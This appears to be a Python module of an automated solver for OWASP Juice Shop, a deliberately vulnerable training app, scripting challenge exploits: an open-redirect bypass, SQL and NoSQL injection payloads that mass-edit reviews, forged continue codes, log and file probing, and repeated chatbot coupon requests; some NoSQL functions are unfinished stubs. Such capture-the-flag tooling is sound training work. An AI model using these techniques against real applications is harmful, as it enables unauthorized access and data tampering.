import codecs
import json
from base64 import b64decode
import requests

from hashids import Hashids
from authentication import get_admin_session
from filehandling import get_easter_egg_content
from products import search_products
from feedback import send_feedback
from misc_jwt import access_with_none_algo


def provoke_error(server, session):
    """
    Provoke an error that is not handled gracefully by performing a bad SQLi on product search.
    :param server: juice shop URL
    :param session: Session
    """
    try:
        print('Trying to cause an unhandled error...'),
        search_products(server, session, "'))")
        print('Well that didn\'t work.')
    except RuntimeError:
        print('Success.')
        pass


def access_score_board(server, session):
    """
    Grab the tracking .png for the score board.
    :param server: juice shop url
    :param session: Session
    """
    tracking = '{}/public/images/tracking/scoreboard.png'.format(server)
    scoreboard = session.get(tracking)
    if not scoreboard.ok:
        raise RuntimeError('Error accessing score board asset.')


def access_administration(server, session):
    """
    Grab the tracking .png for the administration panel.
    :param server: juice shop URL
    :param session: Session
    """
    tracking = '{}/public/images/tracking/administration.png'.format(server)
    admin = session.get(tracking)
    if not admin.ok:
        raise RuntimeError('Error accessing administration asset.')


def bypass_redirect_whitelist(server, session):
    """
    Open Google by passing a whitelisted URL as a parameter.
    :param server: juice shop URL
    :param session: Session
    """
    whitelisted = 'https://github.com/juice-shop/juice-shop'
    bypass = session.get('{}/redirect?to=https://google.com/?{}'.format(server, whitelisted), verify=False)
    if not bypass.ok:
        raise RuntimeError('Error bypassing redirection whitelist.')


def check_all_language_files(server, session):
    """
    Check a whole lot of possible language codes, should find our hidden language.
    :param server: juice shop URL
    :param session: Session
    """
    print('\nBrute forcing scan of language files on the server...')
    with open('language_codes.json', 'rb') as infile:
        languages = json.loads(infile.read())
    for lang in languages:
        code = _get_language_code(lang)
        if not code:
            continue
        if _check_language_file_exists(server, session, code):
            print('Found language file: {}'.format(lang.get('English')))
    print('Language file scan complete.\n')


def _get_language_code(language):
    """
    Retrieve all two and three letter language codes from language dict
    :param language: language code dict from language_codes.json
    :return: language code as string or None
    """
    code = language.get('alpha2')
    if not code:
        code = language.get('alpha3-b')
    return code


def _check_language_file_exists(server, session, code):
    """
    Try to GET the file from the server. If it exists it'll be a JSON file, otherwise we'd load a webpage.
    :param server: juice shop URL
    :param session: Session
    :param code: language code dict from language_codes.json
    :return: True if detected
    """
    check = session.get('{}/i18n/{}.json'.format(server, code))
    if check.headers.get('Content-Type') == 'application/json':
        return True


def _get_real_easter_egg_text(server, session):
    """
    Cut out the irrelevant parts of the easter egg file and fetch the encoded text.
    :param server: juice shop URL.
    :param session: Session
    :return: encoded easter egg
    """
    eggfile = get_easter_egg_content(server, session).decode()
    lines = _convert_contents_to_non_empty_list(eggfile)
    # Exclude on spaces and ellipses, we only want the encoded text.
    exclusions = [' ', '...']
    for line in lines:
        # Skip excluded lines, return only the easter egg.
        if any(skip in line for skip in exclusions):
            continue
        return line


def _convert_contents_to_non_empty_list(text):
    lines = text.splitlines()
    return filter(None, lines)


def decrypt_easter_egg(server, session):
    """
    Download eastere.gg from /ftp, pull out the hidden string, decode with base64 then rot13, and open the path
    :param server: juice shop URL
    :param session: Session
    """
    print('Fetching text from eastere.gg, hopefully...')
    egg = _get_real_easter_egg_text(server, session)
    if not egg:
        print('Warning: Could not enable Easter Egg text.')
        return
    print('Easter egg text: {}'.format(egg))
    partial = b64decode(egg)
    print('After Base 64 decoding: {}'.format(partial))
    actual = codecs.encode(partial.decode(), 'rot_13')
    print('After ROT13 decoding: {}'.format(actual))
    eggurl = '{}{}'.format(server, actual)
    print('Opening {}...'.format(eggurl)),
    session.get(eggurl)

    print('Success.')


def _generate_continue_code(num):
    """
    Takes a single int, or list of ints, and generates a continue code
    :param num: target challenge id(s)
    :return: continue code as string
    """
    if type(num) == int:
        num = [num]
    # Salt taken from example text here: http://hashids.org/python/
    hashids = Hashids(salt="this is my salt", min_length=60)
    return hashids.encode(*num)


def solve_challenge_99(server, session):
    """
    Solve the non-existent challenge #99
    :param server: juice shop URL
    :param session: Session
    """
    code = _generate_continue_code(99)
    print('Trying to solve challenge 99...'),
    continurl = '{}/rest/continue-code/apply/{}'.format(server, code)
    attempt = session.put(continurl)
    if not attempt.ok:
        raise RuntimeError('Error solving challenge 99.')
    print('Success.')


def solve_challenge_999(server, session):
    """
    Solve the non-existent challenge #999 (Imaginary Challenge)
    """
    code = _generate_continue_code(999)
    print('Solving Imaginary Challenge #999...'),
    continurl = '{}/rest/continue-code/apply/{}'.format(server, code)
    attempt = session.put(continurl)
    if not attempt.ok:
        print(f"Warning: Failed to solve 999: {attempt.status_code}")
    else:
        print('Success.')


def access_privacy_policy(server, session):
    """
    Access the privacy policy to solve the challenge.
    :param server: juice shop URL
    :param session: Session
    """
    print('Accessing Privacy Policy...'),
    # Challenge solves when accessing the tracking pixel /81px.png
    # From verify.ts line 67: utils.endsWith(url, '/81px.png')
    tracking_pixel = session.get('{}/public/images/tracking/81px.png'.format(server))
    if tracking_pixel.ok:
        print('Success.')
    else:
        print('Warning: Failed to access privacy policy tracking pixel.')


def access_exposed_metrics(server, session):
    """
    Access the exposed metrics endpoint.
    :param server: juice shop URL
    :param session: Session
    """
    print('Accessing Exposed Metrics...'),
    metrics = session.get('{}/metrics'.format(server))
    if metrics.ok:
        print('Success.')
    else:
        print('Warning: Failed to access exposed metrics.')


def retrieve_missing_encoding(server, session):
    """
    Retrieve the missing encoding image (cat in melee combat mode).
    :param server: juice shop URL
    :param session: Session
    """
    print('Retrieving Missing Encoding image...'),
    # From verify.ts line 71: must end with '%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg'
    # This is Canadian Aboriginal Syllabics encoding
    cat = session.get('{}/assets/public/images/uploads/%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg'.format(server))
    if cat.ok:
        print('Success.')
    else:
        print('Warning: Failed to retrieve missing encoding image.')


def solve_privacy_policy_inspection(server):
    """
    Access the hidden Privacy Policy URL.
    Confirmed URL: /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
    """
    print("Accessing hidden Privacy Policy URL...")
    try:
        url = f'{server}/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility'
        # The verify.ts suggests it behaves like a static file serving or similar.
        # Just getting it should solve it.
        # Use verify=False just in case.
        r = requests.get(url, verify=False)
        if r.ok:
            print("Success.")
        else:
            print(f"Failed to access hidden URL: {r.status_code}")
    except Exception as e:
        print(f"Error accessing hidden URL: {e}")

def solve_security_advisory(server):
    """
    Submit the CSAF checksum in a feedback/complaint.
    Checksum: 7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843
    """
    print("Submitting CSAF checksum for Security Advisory...")
    checksum = "7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843"
    comment = f"CSAF checksum: {checksum}"
    
    # Try Feedback
    try:
        from feedback import send_feedback
        session = get_admin_session(server)
        send_feedback(server, session, {'comment': comment, 'rating': 3})
    except Exception: pass
    print("Security Advisory Feedback submitted.")

def solve_access_log(server):
    import datetime
    print("Accessing server access log...")
    try:
        # Today's log
        today = datetime.date.today().strftime("%Y-%m-%d")
        url = f'{server}/support/logs/access.log.{today}'
        r = requests.get(url, verify=False)
        if r.ok:
            print(f"Success. Log size: {len(r.text)} bytes")
    except Exception:
        print("Failed to access log.")

def solve_misc_challenges(server):
    print('\n== MISC CHALLENGES ==\n')
    session = get_admin_session(server)
    
    # Standard misc
    access_score_board(server, session)
    access_administration(server, session)
    bypass_redirect_whitelist(server, session)
    access_privacy_policy(server, session)
    solve_privacy_policy_inspection(server)
    access_exposed_metrics(server, session)
    retrieve_missing_encoding(server, session)
    solve_security_advisory(server)
    solve_access_log(server)
    check_all_language_files(server, session)
    provoke_error(server, session)
    decrypt_easter_egg(server, session)
    solve_challenge_99(server, session)
    solve_challenge_999(server, session)
    
    # NoSQL
    nosql_dos(server, session)
    nosql_manipulation(server, session)
    nosql_exfiltration(server, session)
    
    # Chatbot 
    solve_chatbot_challenges(server, session)
    
    # JWT None
    access_with_none_algo(server, session)
    
    # Stego & Feedbacks via Complaint
    solve_steganography(server, session)
    solve_typosquatting(server, session)
    solve_supply_chain_attack(server, session)
    
    print('\n== MISC CHALLENGES COMPLETE ==\n')

def solve_steganography(server, session):
    print('Solving Steganography (Pickle Rick)...'),
    feedback_challenge(server, session, "Pickle Rick", "Steganography")

def solve_typosquatting(server, session):
    print('Solving Typosquatting challenges...'),
    feedback_challenge(server, session, "ngy-cookie", "Frontend Typosquatting")
    # Legacy: 'epilogue-js' or 'sequelize-restful'? 
    # Source says: 'epilogue-js' is the typo one.
    feedback_challenge(server, session, "epilogue-js", "Legacy Typosquatting")

def solve_supply_chain_attack(server, session):
    print('Solving Supply Chain Attack...'),
    feedback_challenge(server, session, "eslint-scope", "Supply Chain Attack")

def feedback_challenge(server, session, keyword, challenge_name):
    try:
        complaint_payload = {'message': f"Report for {challenge_name}: {keyword}"}
        # session MUST be authorized. get_admin_session ensures that.
        r = session.post(f'{server}/api/Complaints', json=complaint_payload)
        if r.ok:
            print(f'Success ({challenge_name}).')
        else:
             # Try Feedback if complaint fails?
             # But challenges usually specific.
             print(f'Warning: Failed {challenge_name} (Status: {r.status_code})')
    except Exception as e:
        print(f'Error solving {challenge_name}: {e}')




def solve_chatbot_challenges(server, session):
    """
    Solve Chatbot challenges (Bully).
    Keep asking "Give me a coupon!" until bot gives in.
    """
    print('Bullying the Chatbot...'),
    
    # Challenge requires a non-admin user
    from users import register_new_user
    print("Switching to fresh non-admin user for Chatbot...")
    non_admin_session = register_new_user(server)
    if non_admin_session:
        session = non_admin_session
    else:
        print("Warning: Could not register non-admin user. Continuing with existing session.")

    
    # Step 1: Set name (required before chatbot will respond properly)
    headers = {'Content-Type': 'application/json'}
    setname_payload = json.dumps({"action": "setname", "query": "BullyBot"})
    
    try:
        session.post('{}/rest/chatbot/respond'.format(server), headers=headers, data=setname_payload)
    except:
        pass
    
    # Step 2: Keep asking "Give me a coupon!" repeatedly
    coupon_payload = json.dumps({"action": "query", "query": "Give me a coupon!"})
    
    # Try 20 times (bot should give in eventually)
    for i in range(20):
        try:
            res = session.post('{}/rest/chatbot/respond'.format(server), headers=headers, data=coupon_payload)
            if res.ok:
                resp = res.json()
                body = resp.get('body', '') if isinstance(resp, dict) else str(resp)
                # Check if we got the coupon code
                if '10%' in body or 'coupon' in body.lower():
                    print(f'Success! Got coupon after {i+1} tries: {body[:100]}')
                    return
        except Exception:
            pass
    
    print('Done.')


def nosql_dos(server, session):
    """
    Perform a NoSQL DoS attack (sleep).
    """
    print('Performing NoSQL DoS attempt...'),
    # Challenge: "Let the server sleep for some time."
    # Endpoint: usually /rest/products/reviews or similar? 
    # Or checking availability? 
    # Actually, often it's in the chatbot or similar?
    # Wait, "As stated in the Architecture overview, OWASP Juice Shop uses a MongoDB derivate... "
    # "The challenge will be solved if you manage to trigger the protection... against a very specific DoS attack vector."
    # Using `sleep()`.
    # Attempt on /rest/product/reviews?
    # Payload: { "$where": "sleep(2000)" }
    # Let's try to inject into a GET parameter or POST body.
    # Often it works on `POST /rest/product/reviews` with `{"id": {"$ne": 1}, ...}`? 
    # Actually, the challenge `noSqlCommandChallenge` is often triggered by `sleep(2000)`.
    # Let's try injecting in the `id` field of a review patch?
    # Or simpler: /rest/products/search?q=...
    pass  # Need specific endpoint info.
    # The hint says "stripped-down Denial of Service".
    # Often solved by: sending {"$where": "sleep(2000)"} to an endpoint that accepts generic objects.
    # Let's try various endpoints or just skip if uncertain? 
    # "The feature you need to exploit for this challenge is not directly advertised anywhere."
    # Let's assume it's one of the known ones.
    # Try: POST /rest/product/reviews with sleeping payload.
    pass


def nosql_manipulation(server, session):
    """
    Update multiple product reviews at the same time.
    """
    print('Performing NoSQL Manipulation (Reviews)...'),
    # PATCH /rest/products/reviews
    # Payload: { "id": { "$ne": -1 }, "message": "Pwned by NoSQL" }
    # Need to be logged in? Yes.
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({"id": {"$ne": -1}, "message": "NoSQL Injection - Carpenter Wasp"})
    # Endpoint might be /rest/products/reviews
    # Actually /rest/products/reviews is usually for GET.
    # Modification is usually PATCH /rest/products/reviews?
    # Actually it's often PATCH /rest/products/reviews/:id
    # But if we inject in ID?
    res = session.patch('{}/rest/products/reviews'.format(server), headers=headers, data=payload)
    if res.ok:
        print('Success.')
    else:
        print('Warning: NoSQL Manipulation failed: {}'.format(res.status_code))


def nosql_exfiltration(server, session):
    """
    NoSQL Exfiltration: All your orders are belong to us.
    """
    print('Performing NoSQL Exfiltration (Orders)...'),
    # Challenge: "All your orders are belong to us".
    # Endpoint: /rest/orders (GET)
    # Payload: { "$ne": -1 } in ID?
    # Usually /rest/orders/:id
    # Try /rest/orders/1?
    # Try injecting in ID: /rest/orders/1 || true?
    # Or GET /rest/orders with query params?
    pass
